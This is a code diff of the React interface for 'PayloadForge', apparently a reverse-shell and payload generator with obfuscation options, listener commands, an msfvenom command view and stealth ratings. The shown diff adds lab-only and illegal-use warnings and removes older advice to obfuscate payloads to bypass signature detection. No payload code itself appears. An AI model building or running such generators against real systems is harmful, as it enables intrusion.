-                      Exploit (Vector) → Delivery → <span className="text-red-400 font-bold">Payload</span> (Action)
+                      Access path → execution context → <span className="text-white font-bold">payload behavior</span>
                     </code>
                   </div>
                 </div>
 
                 <div className="space-y-3">
                   <div className="flex items-center gap-2">
-                    <div className="w-1 h-8 bg-cyan-400 rounded-full"></div>
-                    <h3 className="text-cyan-400 font-bold text-sm">Common Payload Types</h3>
+                    <div className="w-1 h-8 bg-emerald-400 rounded-full" />
+                    <h3 className="text-emerald-400 font-bold text-sm">Lab Use (Allowed)</h3>
                   </div>
-                  <ul className="space-y-2 text-white/50 pl-3">
+                  <ul className="space-y-1.5 text-white/50 pl-3">
                     <li className="flex items-start gap-2">
-                      <span className="text-cyan-400 mt-0.5">•</span>
-                      <div><span className="text-white font-medium">Reverse Shell:</span> Target connects back to attacker</div>
+                      <span className="text-emerald-400 mt-0.5">✓</span>
+                      <div>Your own VMs, HTB/THM boxes, or employer-approved ranges</div>
                     </li>
                     <li className="flex items-start gap-2">
-                      <span className="text-cyan-400 mt-0.5">•</span>
-                      <div><span className="text-white font-medium">Bind Shell:</span> Target listens for incoming connection</div>
+                      <span className="text-emerald-400 mt-0.5">✓</span>
+                      <div>Learning how reverse/bind/web shells appear in logs and EDR</div>
                     </li>
                     <li className="flex items-start gap-2">
-                      <span className="text-cyan-400 mt-0.5">•</span>
-                      <div><span className="text-white font-medium">WebShell:</span> Web-based command execution interface</div>
-                    </li>
-                    <li className="flex items-start gap-2">
-                      <span className="text-cyan-400 mt-0.5">•</span>
-                      <div><span className="text-white font-medium">Meterpreter:</span> Advanced post-exploitation framework</div>
-                    </li>
-                    <li className="flex items-start gap-2">
-                      <span className="text-cyan-400 mt-0.5">•</span>
-                      <div><span className="text-white font-medium">Shellcode:</span> Raw machine code for memory injection</div>
+                      <span className="text-emerald-400 mt-0.5">✓</span>
+                      <div>Writing clear findings: what ran, what it connected to, how to fix it</div>
                     </li>
                   </ul>
                 </div>
 
                 <div className="space-y-3">
                   <div className="flex items-center gap-2">
-                    <div className="w-1 h-8 bg-emerald-400 rounded-full"></div>
-                    <h3 className="text-emerald-400 font-bold text-sm">Best Practices</h3>
+                    <div className="w-1 h-8 bg-red-400 rounded-full" />
+                    <h3 className="text-red-400 font-bold text-sm">Unauthorized Use (Illegal)</h3>
                   </div>
-                  <ul className="space-y-2 text-white/50 pl-3">
+                  <ul className="space-y-1.5 text-white/50 pl-3">
                     <li className="flex items-start gap-2">
-                      <span className="text-emerald-400 mt-0.5">✓</span>
-                      <div>Always <span className="text-white font-medium">test</span> payloads in isolated lab environments first</div>
+                      <span className="text-red-400 mt-0.5">✗</span>
+                      <div>Any system you do not own and lack written permission to test</div>
                     </li>
                     <li className="flex items-start gap-2">
-                      <span className="text-emerald-400 mt-0.5">✓</span>
-                      <div>Use <span className="text-white font-medium">obfuscation</span> to bypass signature-based detection</div>
+                      <span className="text-red-400 mt-0.5">✗</span>
+                      <div>"Just checking" a friend's account, school, or employer without approval</div>
                     </li>
                     <li className="flex items-start gap-2">
-                      <span className="text-emerald-400 mt-0.5">✓</span>
-                      <div><span className="text-white font-medium">Verify</span> payloads are functional before deployment</div>
-                    </li>
-                    <li className="flex items-start gap-2">
-                      <span className="text-emerald-400 mt-0.5">✓</span>
-                      <div>Always have a <span className="text-white font-medium">fallback</span> listener ready</div>
-                    </li>
-                    <li className="flex items-start gap-2">
-                      <span className="text-emerald-400 mt-0.5">✓</span>
-                      <div>Stay <span className="text-white font-medium">legal</span> — only test on systems you own or have permission</div>
+                      <span className="text-red-400 mt-0.5">✗</span>
+                      <div>Using templates outside an authorized engagement scope</div>
                     </li>
                   </ul>
                 </div>
               </div>
 
-              <div className="border-t border-white/5 pt-4 mt-2">
-                <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs">
-                  <div className="bg-black/30 border border-white/5 rounded-xl p-3">
-                    <div className="text-amber-400 font-bold mb-1">🎯 Staged vs Stageless</div>
-                    <p className="text-white/50">
-                      <span className="text-white">Staged:</span> Small initial payload downloads the full payload later. 
-                      <span className="text-white ml-2">Stageless:</span> Everything is included in one file.
-                    </p>
-                  </div>
-                  <div className="bg-black/30 border border-white/5 rounded-xl p-3">
-                    <div className="text-amber-400 font-bold mb-1">🔒 Encryption Matters</div>
-                    <p className="text-white/50">
-                      Encrypted payloads (HTTPS, AES) evade network detection but require more complex listeners. 
-                      <span className="text-white ml-2">Trade-off: Stealth vs Complexity.</span>
-                    </p>
-                  </div>
-                  <div className="bg-black/30 border border-white/5 rounded-xl p-3">
-                    <div className="text-amber-400 font-bold mb-1">📊 Detection Reality</div>
-                    <p className="text-white/50">
-                      Most payloads are <span className="text-white">detectable</span> by modern EDR. The goal is 
-                      <span className="text-white ml-1">delaying detection</span> long enough to achieve objectives.
-                    </p>
-                  </div>
+              <div className="border-t border-white/5 pt-3 grid grid-cols-1 md:grid-cols-3 gap-3 text-[11px]">
+                <div className="bg-black/30 border border-white/5 rounded-xl p-3">
+                  <div className="text-amber-400 font-bold mb-1 flex items-center gap-1"><Award size={14} /> Real Red Team</div>
+                  <p className="text-white/50 text-[11px]">
+                    Professional engagements use custom C2, encrypted channels, and multi-stage payloads.
+                    This tool provides educational templates — not production-grade attack tools.
+                  </p>
+                </div>
+                <div className="bg-black/30 border border-white/5 rounded-xl p-3">
+                  <div className="text-amber-400 font-bold mb-1 flex items-center gap-1"><Scan size={14} /> Detection Focus</div>
+                  <p className="text-white/50 text-[11px]">
+                    The real value is recognizing indicators: unusual outbound ports, Office spawning shells,
+                    web processes running system commands, and suspicious registry changes.
+                  </p>
+                </div>
+                <div className="bg-black/30 border border-white/5 rounded-xl p-3">
+                  <div className="text-amber-400 font-bold mb-1 flex items-center gap-1"><Shield size={14} /> Authorized Testing</div>
+                  <p className="text-white/50 text-[11px]">
+                    Professional testing follows rules of engagement, scopes, and reporting.
+                    These templates are starting points for understanding — not a license to attack.
+                  </p>
                 </div>
               </div>
 
               <div className="text-[10px] text-white/30 text-center border-t border-white/5 pt-3">
-                <span className="text-red-400">⚠️</span> This information is for <span className="text-white font-medium">educational and authorized testing</span> purposes only. 
-                Unauthorized use of payloads is illegal.
+                Educational reference only. Unauthorized access and misuse are illegal.
               </div>
             </div>
           )}
@@ -2666,27 +3820,41 @@ export default function PayloadForge() {
         {/* ── ENCYCLOPEDIA TAB ── */}
         {activeTab === 'encyclopedia' && (
           <div>
-            <div className="mb-6">
-              <h2 className="text-xl font-semibold text-white mb-1">Payload Encyclopedia</h2>
-              <p className="text-white/40 text-sm">Learn what each payload does, when to use it, and how it works. Click on a card to expand for deep dive details.</p>
+            <div className="mb-4 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
+              <div>
+                <h2 className="text-xl font-semibold text-white mb-0.5 flex items-center gap-2">
+                  <BookOpen size={20} className="text-red-400" /> Payload Encyclopedia
+                </h2>
+                <p className="text-white/35 text-sm">
+                  {PAYLOAD_ENCYCLOPEDIA.length} payloads · click a card for details
+                </p>
+              </div>
+              <input
+                value={encyclopediaSearch}
+                onChange={e => setEncyclopediaSearch(e.target.value)}
+                placeholder="Search payloads, categories, techniques…"
+                className="w-full sm:w-72 bg-black/40 border border-white/10 rounded-xl px-4 py-2.5 text-sm text-white/80 placeholder-white/25 focus:outline-none focus:border-red-500/40 transition-colors"
+              />
             </div>
 
             <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
-              {PAYLOAD_ENCYCLOPEDIA.map((payload) => {
-                const isExpanded = expandedPayloads.has(payload.type)
+              {filteredEncyclopedia.map((payload) => {
+                const isExpanded = expandedPayloads.has(payload.type);
                 return (
                   <div
                     key={payload.type}
-                    className={`bg-white/5 border rounded-2xl p-5 transition-all cursor-pointer ${
-                      isExpanded ? 'border-red-500/30 bg-red-500/5' : 'border-white/5 hover:border-red-500/20'
-                    }`}
+                    className={`bg-white/5 border rounded-2xl p-5 transition-all cursor-pointer ${isExpanded ? 'border-red-500/40 bg-red-500/5 shadow-lg shadow-red-500/5' : 'border-white/5 hover:border-red-500/20 hover:bg-white/[0.03]'
+                      }`}
                     onClick={() => toggleExpand(payload.type)}
                   >
                     <div className="flex items-start justify-between mb-3">
-                      <div className={`${payload.color} group-hover:scale-110 transition-transform`}>
+                      <div className={`${payload.color} transition-transform`}>
                         {payload.icon}
                       </div>
                       <div className="flex items-center gap-2" onClick={e => e.stopPropagation()}>
+                        <span className={`text-[9px] px-2 py-0.5 rounded-full border ${getStealthBadge(payload.stealthRating)}`}>
+                          {payload.stealthRating} stealth
+                        </span>
                         <div className="text-[10px] px-2 py-0.5 rounded-full bg-white/5 border border-white/10 text-white/40">
                           {payload.supportedFormats.length} formats
                         </div>
@@ -2696,6 +3864,17 @@ export default function PayloadForge() {
 
                     <h3 className="text-base font-bold text-white mb-1">{payload.name}</h3>
                     <p className="text-white/50 text-xs mb-3">{payload.description}</p>
+
+                    <div className="flex flex-wrap gap-1.5 mb-3">
+                      <span className="text-[9px] px-2 py-0.5 rounded-full bg-white/5 border border-white/10 text-white/30">
+                        {payload.category}
+                      </span>
+                      {!payload.isComplete && (
+                        <span className="text-[9px] px-2 py-0.5 rounded-full bg-amber-500/10 border border-amber-500/20 text-amber-400 flex items-center gap-1">
+                          <AlertCircle size={10} /> Template
+                        </span>
+                      )}
+                    </div>
 
                     <div className="space-y-2 text-xs">
                       <div>
@@ -2709,20 +3888,24 @@ export default function PayloadForge() {
                     </div>
 
                     {isExpanded && (
-                      <div className="mt-4 pt-4 border-t border-white/5 space-y-3 animate-in slide-in-from-top-4 duration-200">
+                      <div className="mt-4 pt-4 border-t border-white/5 space-y-3 animate-slideDown">
                         <div>
                           <div className="text-cyan-400 text-[10px] font-mono mb-0.5 flex items-center gap-1"><Lightbulb size={12} /> HOW IT WORKS</div>
                           <p className="text-xs text-white/50 leading-relaxed">{payload.howItWorks}</p>
                         </div>
                         <div>
-                          <div className="text-amber-400 text-[10px] font-mono mb-0.5">EXAMPLE SCENARIO</div>
+                          <div className="text-amber-400 text-[10px] font-mono mb-0.5 flex items-center gap-1"><Target size={12} /> EXAMPLE SCENARIO</div>
                           <p className="text-xs text-white/50">{payload.exampleScenario}</p>
                         </div>
                         <div>
-                          <div className="text-emerald-400 text-[10px] font-mono mb-0.5">LISTENER COMMAND</div>
-                          <code className="text-[10px] bg-black/30 px-2 py-1.5 rounded block font-mono text-emerald-400 break-all">
+                          <div className="text-emerald-400 text-[10px] font-mono mb-0.5 flex items-center gap-1"><Terminal size={12} /> LISTENER COMMAND</div>
+                          <code className="text-[10px] bg-black/40 px-2 py-1.5 rounded block font-mono text-emerald-400 break-all border border-white/5">
                             {payload.commonListenerCommand}
                           </code>
+                        </div>
+                        <div>
+                          <div className="text-purple-400 text-[10px] font-mono mb-0.5 flex items-center gap-1"><Award size={12} /> LAB VS REAL WORLD</div>
+                          <p className="text-xs text-white/50 leading-relaxed">{payload.labVsReal}</p>
                         </div>
                         <div className="grid grid-cols-2 gap-3">
                           <div>
@@ -2739,37 +3922,39 @@ export default function PayloadForge() {
                           </div>
                         </div>
                         <div>
-                          <div className="text-white/30 text-[10px] font-mono mb-0.5">REFERENCES</div>
+                          <div className="text-white/30 text-[10px] font-mono mb-0.5 flex items-center gap-1"><ExternalLink size={12} /> REFERENCES</div>
                           <ul className="text-[10px] text-white/50 list-disc list-inside">
                             {renderReferences(payload.references)}
                           </ul>
                         </div>
-                        {!payload.isComplete && (
-                          <div className="text-[10px] text-amber-400 flex items-center gap-1">
-                            <AlertCircle size={12} /> Template only — may need completion for production use
-                          </div>
-                        )}
-                        <button
-                          onClick={(e) => {
-                            e.stopPropagation()
-                            handlePayloadChange(payload.type)
-                            setActiveTab('generator')
-                          }}
-                          className="text-[10px] flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-red-500/10 hover:bg-red-500/20 text-red-400 transition-colors border border-red-500/20"
-                        >
-                          <Play size={12} /> Generate this payload
-                        </button>
+                        <div className="flex flex-wrap gap-2">
+                          <button
+                            onClick={(e) => {
+                              e.stopPropagation();
+                              handlePayloadChange(payload.type);
+                              setActiveTab('generator');
+                            }}
+                            className="text-[10px] flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-red-500/10 hover:bg-red-500/20 text-red-400 transition-colors border border-red-500/20"
+                          >
+                            <Play size={12} /> Generate this payload
+                          </button>
+                          <span className="text-[9px] text-white/20 flex items-center gap-1">
+                            <Star size={10} /> {payload.pros.length} pros · {payload.cons.length} cons
+                          </span>
+                        </div>
                       </div>
                     )}
 
                     <div className="mt-3 pt-3 border-t border-white/5 flex justify-between items-center">
-                      <span className="text-[10px] text-white/30">{isExpanded ? 'Click to collapse' : 'Click for deep dive'}</span>
-                      <span className="text-[10px] text-white/30 flex items-center gap-1">
-                        {payload.pros.length} pros · {payload.cons.length} cons
+                      <span className="text-[10px] text-white/30">{isExpanded ? 'Click to collapse' : 'Click for details'}</span>
+                      <span className="text-[10px] text-white/30 flex items-center gap-2">
+                        <span className={`px-1.5 py-0.5 rounded text-[8px] ${getStealthBadge(payload.detectionComplexity)}`}>
+                          detection: {payload.detectionComplexity}
+                        </span>
                       </span>
                     </div>
                   </div>
-                )
+                );
               })}
             </div>
           </div>
@@ -2777,23 +3962,23 @@ export default function PayloadForge() {
 
         {/* ── GENERATOR TAB ── */}
         {activeTab === 'generator' && currentPayloadInfo && (
-          <div className="grid grid-cols-1 xl:grid-cols-12 gap-6">
+          <div className="grid grid-cols-1 xl:grid-cols-12 gap-5">
             <div className="xl:col-span-5 space-y-4">
-              <div className="bg-white/5 border border-white/5 rounded-2xl p-5">
+              <div className="bg-white/5 border border-white/5 rounded-2xl p-5 shadow-lg shadow-black/20">
                 <div className="flex justify-between items-center mb-4">
                   <h3 className="text-sm font-semibold text-white flex items-center gap-2">
                     <Target size={16} className="text-red-400" /> Payload Configuration
                   </h3>
                   <button
                     onClick={() => {
-                      setLhost('10.10.14.5')
-                      setLport(currentPayloadInfo.defaultPort)
-                      setFormat(currentPayloadInfo.supportedFormats[0])
-                      setObfuscation('none')
-                      setGeneratedPayload('')
-                      setShowRaw(false)
-                      setLhostError(null)
-                      setLportError(null)
+                      setLhost('10.10.14.5');
+                      setLport(currentPayloadInfo.defaultPort);
+                      setFormat(currentPayloadInfo.supportedFormats[0]);
+                      setObfuscation('none');
+                      setGeneratedPayload('');
+                      setShowRaw(false);
+                      setLhostError(null);
+                      setLportError(null);
                     }}
                     className="text-[10px] text-white/40 hover:text-white/80 transition-colors"
                   >
@@ -2802,7 +3987,7 @@ export default function PayloadForge() {
                 </div>
 
                 <div className="mb-4">
-                  <label className="text-[10px] text-white/40 block mb-1.5">Payload Type</label>
+                  <label className="text-[10px] text-white/40 block mb-1.5 font-medium">Payload Type</label>
                   <select
                     value={selectedPayload}
                     onChange={(e) => handlePayloadChange(e.target.value as PayloadType)}
@@ -2818,7 +4003,7 @@ export default function PayloadForge() {
                   </select>
                 </div>
 
-                <div className="mb-4 p-3 bg-black/30 border border-white/5 rounded-xl">
+                <div className="mb-4 p-3 bg-black/40 border border-white/5 rounded-xl">
                   <div className="flex items-center gap-2 mb-2">
                     <div className={currentPayloadInfo.color}>{currentPayloadInfo.icon}</div>
                     <div>
@@ -2828,19 +4013,53 @@ export default function PayloadForge() {
                   </div>
                   <div className="text-[10px] text-white/40 space-y-0.5">
                     <div><strong className="text-red-400">Where to use:</strong> {currentPayloadInfo.whereToUse}</div>
-                    <div><strong className="text-red-400">How it works:</strong> <span className="italic">{currentPayloadInfo.howItWorks.slice(0, 100)}...</span></div>
-                    <div><strong className="text-red-400">Listener:</strong> <code className="text-cyan-400 bg-black/30 px-1 py-0.5 rounded">{substituteListener(currentPayloadInfo.commonListenerCommand, lhost, lport)}</code></div>
+                    <div className="flex items-start gap-2 flex-wrap">
+                      <strong className="text-red-400">Listener:</strong>
+                      <code className="text-cyan-400 bg-black/30 px-1.5 py-0.5 rounded break-all flex-1 font-mono text-[10px]">
+                        {substituteListener(currentPayloadInfo.commonListenerCommand, lhost, lport)}
+                      </code>
+                      <button
+                        type="button"
+                        onClick={copyListener}
+                        className="text-[10px] px-2 py-0.5 rounded border border-white/10 text-white/50 hover:text-white/80 transition-colors"
+                      >
+                        {listenerCopyOk ? '✓' : 'Copy'}
+                      </button>
+                    </div>
                   </div>
-                  {!currentPayloadInfo.isComplete && (
-                    <div className="mt-1 text-[10px] text-amber-400 flex items-center gap-1">
-                      <AlertCircle size={10} /> Template only — may need completion for production use
+                  <div className="flex gap-2 mt-1.5 flex-wrap">
+                    <span className={`text-[8px] px-1.5 py-0.5 rounded-full border ${getStealthBadge(currentPayloadInfo.stealthRating)}`}>
+                      stealth: {currentPayloadInfo.stealthRating}
+                    </span>
+                    <span className={`text-[8px] px-1.5 py-0.5 rounded-full border ${getStealthBadge(currentPayloadInfo.detectionComplexity)}`}>
+                      detection: {currentPayloadInfo.detectionComplexity}
+                    </span>
+                    {!currentPayloadInfo.isComplete && (
+                      <span className="text-[8px] px-1.5 py-0.5 rounded-full bg-amber-500/10 border border-amber-500/20 text-amber-400 flex items-center gap-1">
+                        <AlertCircle size={8} /> Template
+                      </span>
+                    )}
+                  </div>
+                  {msfvenomCmd && (
+                    <div className="mt-2 p-2 rounded-lg bg-black/50 border border-white/5">
+                      <div className="text-[10px] text-amber-400/80 font-mono mb-1 flex items-center gap-1">
+                        <Code size={10} /> msfvenom equivalent
+                      </div>
+                      <code className="text-[10px] text-white/50 break-all block font-mono">{msfvenomCmd}</code>
+                      <button
+                        type="button"
+                        onClick={() => copyToClipboard(msfvenomCmd)}
+                        className="mt-1 text-[10px] text-cyan-400/80 hover:text-cyan-300 transition-colors"
+                      >
+                        Copy msfvenom
+                      </button>
                     </div>
                   )}
                 </div>
 
                 <div className="grid grid-cols-2 gap-3 mb-4">
                   <div>
-                    <label className="text-[10px] text-white/40 block mb-1">LHOST</label>
+                    <label className="text-[10px] text-white/40 block mb-1 font-medium">LHOST</label>
                     <input
                       type="text"
                       value={lhost}
@@ -2852,7 +4071,7 @@ export default function PayloadForge() {
                     {lhostError && <div className="text-[10px] text-red-400 mt-1">{lhostError}</div>}
                   </div>
                   <div>
-                    <label className="text-[10px] text-white/40 block mb-1">LPORT</label>
+                    <label className="text-[10px] text-white/40 block mb-1 font-medium">LPORT</label>
                     <input
                       type="number"
                       min="1"
@@ -2869,7 +4088,7 @@ export default function PayloadForge() {
 
                 <div className="grid grid-cols-2 gap-3">
                   <div>
-                    <label className="text-[10px] text-white/40 block mb-1">Output Format</label>
+                    <label className="text-[10px] text-white/40 block mb-1 font-medium">Output Format</label>
                     <select
                       value={format}
                       onChange={(e) => setFormat(e.target.value as OutputFormat)}
@@ -2881,7 +4100,7 @@ export default function PayloadForge() {
                     </select>
                   </div>
                   <div>
-                    <label className="text-[10px] text-white/40 block mb-1">Obfuscation</label>
+                    <label className="text-[10px] text-white/40 block mb-1 font-medium">Obfuscation</label>
                     <select
                       value={obfuscation}
                       onChange={(e) => setObfuscation(e.target.value as ObfuscationLevel)}
@@ -2901,18 +4120,63 @@ export default function PayloadForge() {
                 </div>
               </div>
 
-              <button
-                onClick={generate}
-                className="w-full py-3.5 rounded-xl font-bold text-white text-sm flex items-center justify-center gap-2 transition-all"
-                style={{ background: 'linear-gradient(90deg, #dc2626, #b91c1c)' }}
-              >
-                Generate Payload <Zap size={14} />
-              </button>
+              <div className="flex items-center justify-between gap-2">
+                <label className="flex items-center gap-2 text-[11px] text-white/45 cursor-pointer select-none">
+                  <input
+                    type="checkbox"
+                    checked={autoGenerate}
+                    onChange={e => setAutoGenerate(e.target.checked)}
+                    className="rounded border-white/20 accent-red-500"
+                  />
+                  Auto-generate on change
+                </label>
+                <button
+                  onClick={generate}
+                  className="px-6 py-2.5 rounded-xl font-bold text-white text-sm flex items-center gap-2 transition-all hover:scale-[1.02] active:scale-[0.98] shadow-lg shadow-red-500/20"
+                  style={{ background: 'linear-gradient(135deg, #dc2626, #b91c1c)' }}
+                >
+                  <Zap size={14} /> Generate
+                </button>
+              </div>
+
+              <p className="text-[10px] text-white/30 text-center leading-relaxed">
+                ⚠️ Output is for isolated labs / authorized tests only. Unauthorized use is illegal.
+              </p>
+
+              {history.length > 0 && (
+                <div className="bg-white/5 border border-white/5 rounded-2xl p-4">
+                  <div className="text-[10px] uppercase tracking-wider text-white/30 font-semibold mb-2 flex items-center gap-1.5">
+                    <Clock size={10} /> Recent generations
+                  </div>
+                  <div className="space-y-1.5 max-h-40 overflow-y-auto custom-scrollbar">
+                    {history.map(h => (
+                      <button
+                        key={h.id}
+                        type="button"
+                        onClick={() => {
+                          setSelectedPayload(h.type);
+                          setFormat(h.format);
+                          setLhost(h.lhost);
+                          setLport(h.lport);
+                          setActiveTab('generator');
+                        }}
+                        className="w-full text-left px-2.5 py-2 rounded-lg bg-black/30 border border-white/5 hover:border-red-500/25 transition-colors"
+                      >
+                        <div className="flex justify-between gap-2 text-[11px]">
+                          <span className="text-white/70 font-medium truncate">{h.type}</span>
+                          <span className="text-white/30 font-mono">{h.format}</span>
+                        </div>
+                        <div className="text-[10px] text-white/35 font-mono truncate mt-0.5">{h.lhost}:{h.lport} · {h.snippet}</div>
+                      </button>
+                    ))}
+                  </div>
+                </div>
+              )}
             </div>
 
             <div className="xl:col-span-7">
-              <div className="bg-white/5 border border-white/5 rounded-2xl p-5 h-full flex flex-col">
-                <div className="flex justify-between items-center mb-3">
+              <div className="bg-white/5 border border-white/5 rounded-2xl p-5 h-full flex flex-col shadow-lg shadow-black/20">
+                <div className="flex justify-between items-center mb-3 flex-wrap gap-2">
                   <h3 className="text-sm font-semibold text-white flex items-center gap-2">
                     <Code size={14} className="text-red-400" /> Generated Payload
                   </h3>
@@ -2922,10 +4186,10 @@ export default function PayloadForge() {
                         {showRaw ? <EyeOff size={12} /> : <Eye size={12} />} {showRaw ? 'Formatted' : 'Raw'}
                       </button>
                       <button onClick={() => copyToClipboard(generatedPayload)} className="text-[10px] px-2 py-1 rounded-xl border border-white/10 text-white/40 hover:text-white/80 transition-colors flex items-center gap-1">
-                        {copyStatus === 'success' ? <><CheckCircle size={12} /> Copied!</> : 
-                         copyStatus === 'error' ? <><AlertCircle size={12} /> Failed</> :
-                         copyStatus === 'manual' ? <><Copy size={12} /> Select</> :
-                         <><Copy size={12} /> Copy</>}
+                        {copyStatus === 'success' ? <><CheckCircle size={12} className="text-emerald-400" /> Copied!</> :
+                          copyStatus === 'error' ? <><AlertCircle size={12} className="text-red-400" /> Failed</> :
+                            copyStatus === 'manual' ? <><Copy size={12} /> Select</> :
+                              <><Copy size={12} /> Copy</>}
                       </button>
                       <button onClick={downloadPayload} className="text-[10px] px-2 py-1 rounded-xl bg-red-500/10 text-red-400 hover:bg-red-500/20 border border-red-500/20 transition-colors flex items-center gap-1">
                         <Download size={12} /> Download
@@ -2934,9 +4198,9 @@ export default function PayloadForge() {
                   )}
                 </div>
 
-                <div className="flex-1 bg-black/30 rounded-xl p-3 overflow-auto font-mono text-xs border border-white/5 min-h-[280px]">
+                <div className="flex-1 bg-black/50 rounded-xl p-3 overflow-auto font-mono text-xs border border-white/5 min-h-[280px] max-h-[500px]">
                   {generatedPayload ? (
-                    <pre className="whitespace-pre-wrap break-all text-emerald-400">
+                    <pre className="whitespace-pre-wrap break-all text-emerald-400/90 leading-relaxed">
                       {showRaw ? generatedPayload : generatedPayload
                         .split('\n')
                         .map((line, i) => <div key={i} className="leading-relaxed break-all">{line || '\u00A0'}</div>)}
@@ -2945,31 +4209,32 @@ export default function PayloadForge() {
                     <div className="h-full flex items-center justify-center text-center text-white/30">
                       <div>
                         <Swords size={40} className="mx-auto mb-3 opacity-30" />
-                        <p className="text-sm">Click "Generate Payload" to create your payload</p>
+                        <p className="text-sm">Configure a payload and generate</p>
+                        <p className="text-[11px] text-white/20 mt-1">Lab use only</p>
                       </div>
                     </div>
                   )}
                 </div>
 
                 {generatedPayload && (
-                  <div className="mt-3 p-3 bg-black/30 border border-white/5 rounded-xl text-xs">
+                  <div className="mt-3 p-3 bg-black/40 border border-white/5 rounded-xl text-xs">
                     <div className="font-semibold text-red-400 mb-1.5 flex items-center gap-1.5">
                       <Lightbulb size={12} /> Quick Usage Guide
                     </div>
                     <p className="text-white/50">{currentPayloadInfo.howToUse}</p>
                     <div className="mt-1.5 text-[10px] text-white/40">
-                      <span className="text-white">Listener:</span> <code className="bg-black/30 px-1.5 py-0.5 rounded text-emerald-400">{substituteListener(currentPayloadInfo.commonListenerCommand, lhost, lport)}</code>
+                      <span className="text-white">Listener:</span> <code className="bg-black/40 px-1.5 py-0.5 rounded text-emerald-400 font-mono">{substituteListener(currentPayloadInfo.commonListenerCommand, lhost, lport)}</code>
                     </div>
                     <div className="mt-1.5 grid grid-cols-2 gap-2 text-[10px]">
                       <div className="border border-emerald-500/20 rounded p-1.5 bg-emerald-500/5">
-                        <div className="text-emerald-400 font-mono text-[9px]">PROS</div>
-                        <ul className="list-disc list-inside text-white/40 mt-0.5 space-y-0.5">
+                        <div className="text-emerald-400 font-mono text-[9px] flex items-center gap-1"><CheckCircle size={10} /> PROS</div>
+                        <ul className="list-disc list-inside text-white/40 mt-0.5 space-y-0.5 text-[10px]">
                           {currentPayloadInfo.pros.slice(0, 2).map((p, i) => <li key={i}>{p}</li>)}
                         </ul>
                       </div>
                       <div className="border border-red-500/20 rounded p-1.5 bg-red-500/5">
-                        <div className="text-red-400 font-mono text-[9px]">CONS</div>
-                        <ul className="list-disc list-inside text-white/40 mt-0.5 space-y-0.5">
+                        <div className="text-red-400 font-mono text-[9px] flex items-center gap-1"><AlertCircle size={10} /> CONS</div>
+                        <ul className="list-disc list-inside text-white/40 mt-0.5 space-y-0.5 text-[10px]">
                           {currentPayloadInfo.cons.slice(0, 2).map((c, i) => <li key={i}>{c}</li>)}
                         </ul>
                       </div>
@@ -2982,17 +4247,19 @@ export default function PayloadForge() {
         )}
       </div>
 
-      {/* Manual Copy Modal with Select All */}
+      {/* Manual Copy Modal */}
       {copyStatus === 'manual' && (
         <div className="fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-4" onClick={() => setCopyStatus('idle')}>
-          <div className="bg-[#0d1022] border border-white/10 rounded-2xl p-6 max-w-2xl w-full" onClick={e => e.stopPropagation()}>
-            <h3 className="text-lg font-bold text-white mb-2">Manual Copy Required</h3>
+          <div className="bg-[#0d1022] border border-white/10 rounded-2xl p-6 max-w-2xl w-full shadow-2xl" onClick={e => e.stopPropagation()}>
+            <h3 className="text-lg font-bold text-white mb-2 flex items-center gap-2">
+              <Copy size={18} className="text-cyan-400" /> Manual Copy Required
+            </h3>
             <p className="text-sm text-white/40 mb-3">
-              Tap "Select All" below, then press <kbd className="bg-white/10 px-1.5 py-0.5 rounded text-white/60">Ctrl+C</kbd> (or <kbd className="bg-white/10 px-1.5 py-0.5 rounded text-white/60">Cmd+C</kbd> on Mac, long-press → Copy on mobile).
+              Tap "Select All" below, then press <kbd className="bg-white/10 px-1.5 py-0.5 rounded text-white/60">Ctrl+C</kbd> or <kbd className="bg-white/10 px-1.5 py-0.5 rounded text-white/60">Cmd+C</kbd>.
             </p>
-            <pre 
+            <pre
               ref={manualCopyRef}
-              className="w-full h-64 bg-black/30 border border-white/5 rounded-xl p-3 font-mono text-xs overflow-auto whitespace-pre-wrap break-all select-text text-emerald-400"
+              className="w-full h-64 bg-black/50 border border-white/5 rounded-xl p-3 font-mono text-xs overflow-auto whitespace-pre-wrap break-all select-text text-emerald-400/90 leading-relaxed"
             >
               {generatedPayload}
             </pre>
@@ -3014,14 +4281,15 @@ export default function PayloadForge() {
       <style dangerouslySetInnerHTML={{ __html: `
         .custom-scrollbar::-webkit-scrollbar { width: 3px; }
         .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
-        .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 10px; }
-        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.2); }
+        .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.08); border-radius: 10px; }
+        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.15); }
         @keyframes slideDown {
-          from { opacity: 0; transform: translateY(-10px); }
+          from { opacity: 0; transform: translateY(-8px); }
           to { opacity: 1; transform: translateY(0); }
         }
-        .animate-slideDown { animation: slideDown 0.25s ease-out; }
+        .animate-slideDown { animation: slideDown 0.2s ease-out; }
+        ::selection { background: rgba(239, 68, 68, 0.3); color: white; }
       `}} />
     </div>
-  )
+  );
 }
